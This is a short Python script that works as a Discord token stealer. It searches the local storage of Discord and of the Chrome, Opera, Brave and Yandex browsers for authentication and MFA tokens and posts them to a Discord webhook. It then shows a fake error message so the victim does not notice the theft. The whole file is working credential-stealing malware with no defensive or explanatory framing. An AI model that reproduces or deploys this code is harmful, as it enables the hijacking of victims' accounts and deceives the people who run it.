import os
import re
import requests as req
from dhooks import Webhook

Webhook_URL = ''


def error():
    print('Oops! An error has occurred!\n')
    print('YOUR ERROR HERE')


def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    rgx_tkn1 = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    rgx_tkn2 = 'mfa\.[\w-]{84}'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (rf'{rgx_tkn1}', rf'{rgx_tkn2}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ''

    for key, value in paths.items():
        try:    
            tokens = find_tokens(value)
            message += f'\n**{key}**\n'
            message += f'{tokens}'
        except:
            pass
    
    try:
        Webhook(Webhook_URL).send(message)
    except:
        pass

    error()
    input("Press enter to exit")
       

main()